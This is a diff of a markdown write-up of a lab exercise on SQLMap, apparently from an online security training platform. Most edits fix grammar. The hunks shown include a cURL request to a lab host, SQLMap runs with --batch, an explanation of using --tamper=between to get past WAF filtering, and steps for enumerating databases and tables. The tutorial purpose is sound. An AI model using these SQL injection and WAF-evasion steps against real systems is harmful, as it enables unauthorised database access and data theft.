@@ -1,4 +1,4 @@
-# Write-up: SQL Injection Fundamentals
+# Write-up: SQLMap Essentials
 
 | Vulnerability | Difficulty | Platform | Key concepts |
 | :--- | :--- | :--- | :--- |
@@ -23,7 +23,7 @@ Navigate through the website to find potential attack vectors.
 ![Found potential attack by adding products to the cart](./assets/find_vector_attack.png "Found potential attack")
 
 ## Step 2 "Get cURL"
-Now that we found a call to the endpoint, we can copy the call as cURL.
+Now that we have found a call to the endpoint, we can copy the call as cURL.
 ```ps
 curl 'http://94.237.55.43:34697/action.php' -X POST -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0' -H 'Accept: */*' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Referer: http://94.237.55.43:34697/shop.html' -H 'Content-Type: application/json' -H 'Origin: http://94.237.55.43:34697' -H 'DNT: 1' -H 'Connection: keep-alive' -H 'Sec-GPC: 1' -H 'Priority: u=0' --data-raw '{"id":1}'
 ```
@@ -31,7 +31,7 @@ curl 'http://94.237.55.43:34697/action.php' -X POST -H 'User-Agent: Mozilla/5.0 
 This will help us build the right command for SQLMap
 
 ## Step 3 "Try call with SQLMap"
-Let's try this command with SQLMap, we also added `--batch` this way SQLMap will not stop when it ask a question.
+Let's try this command with SQLMap. We also added `--batch`, so SQLMap will not stop when it asks a question.
 
 ```ps
 ┌─[us-academy-6]─[10.10.15.4]─[htb-ac-1889896@htb-hxqshubmjv]─[~]
@@ -79,11 +79,11 @@ back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
 [*] ending @ 23:27:06 /2025-08-23/
 ```
 
-As we can see, the command give us this:
+As we can see, the command gives us this:
 ```ps
 [23:27:01] [WARNING] it appears that the character '>' is filtered by the back-end server. You are strongly advised to rerun with the '--tamper=between'
 ```
-That means we need to bypass WAF/IPS solutions with `--tamper=between`, this work by replacing all occurrences of greater than operator (`>`) with `NOT BETWEEN 0 AND #`, and the equals operator (`=`) with `BETWEEN # AND #`. This way, many primitive protection mechanisms (focused mostly on preventing XSS attacks) are easily bypassed, at least for SQLi purposes.
+That means we need to bypass WAF/IPS solutions with `--tamper=between`, this works by replacing all occurrences of the greater than operator (`>`) with `NOT BETWEEN 0 AND #`, and the equals operator (`=`) with `BETWEEN # AND #`. This way, many primitive protection mechanisms (focused mostly on preventing XSS attacks) are easily bypassed, at least for SQLi purposes.
 
 We also get this log:
 ```ps
@@ -157,7 +157,7 @@ available databases [2]:
 ```
 
 ## Step 5 "Get Tables"
-In this exercise we already know which table we are looking for, but let's search for all the tables available in the `production` database with `--tables`.
+In this exercise, we already know which table we are looking for, but let's search for all the tables available in the `production` database with `--tables`.
 
 ```ps
 ┌─[us-academy-6]─[10.10.15.4]─[htb-ac-1889896@htb-hxqshubmjv]─[~]
